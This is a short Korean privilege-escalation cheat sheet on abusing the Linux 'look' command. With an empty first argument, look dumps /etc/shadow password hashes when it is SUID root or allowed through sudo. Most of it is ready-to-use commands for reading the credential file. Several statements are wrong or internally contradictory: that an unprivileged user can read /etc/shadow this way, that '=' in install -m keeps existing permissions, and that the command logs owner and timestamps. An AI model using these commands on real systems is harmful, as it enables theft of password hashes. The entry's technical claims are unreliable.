# look 명령어를 이용한 권한 상승

> 무엇: 사전 검색 명령 look을 빈 문자열 인자로 실행하면(`look '' /etc/shadow`) 파일 전체를 출력할 수 있다는 점을 이용해 /etc/shadow 해시를 뽑는 권한 상승 기법 문서
> 언제: shadow 직접 읽기가 막혀 있고 look이 SUID로 설정돼 있거나 sudo -l에 있을 때, 비밀번호 해시 전체를 확보하는 파일 읽기 경로로 쓴다
> 조건: look이 root 소유 SUID이거나 sudo 허용 대상이어야 하고, SUID 사본은 `install -m =xs $(which look)`로 만든다. Linux 전용이다

## 개요

`look`은 파일을 읽는 데 특화된 명령어다. 보이지 않는 문자도 표시하며, 파일 전체 내용을 출력할 수 있다.
그래서 권한이 없는 계정으로 실행해도 `/etc/shadow`, `/root`의 비밀번호 해시를 읽을 수 있다.

## 기본 사용

```bash
# 파일 내용을 터미널에 출력
look '' /etc/shadow

# 특정 문자열로 시작하는 줄만
look 'root:' /etc/shadow
```

- 첫 인자는 비워둔다(빈 문자열).
- 두 번째 인자로 읽을 파일을 지정한다.

## 권한 상승 시나리오

```bash
# 1) 권한 없이 실행 시도
LFILE=/etc/shadow
look '' "$LFILE"

# 2) SUID 설정된 look를 이용
sudo install -m =xs $(which look) /tmp/look_suid
/tmp/look_suid '' /etc/shadow

# 3) sudo로 실행
sudo /path/to/look '' /etc/shadow
```

- `-m =xs` : SUID와 실행 권한을 설정(`=`로 기존 권한 유지).
- 파일 내용을 바로 읽으므로, 비밀번호 해시 전체를 확보할 수 있다.

## 주의

- 이 명령은 Linux 전용이며, Windows 권한 상승은 LOLBAS 문서 참고.
- 대상 파일의 소유자/그룹/타임스탬프를 함께 기록한다(증적 활용).
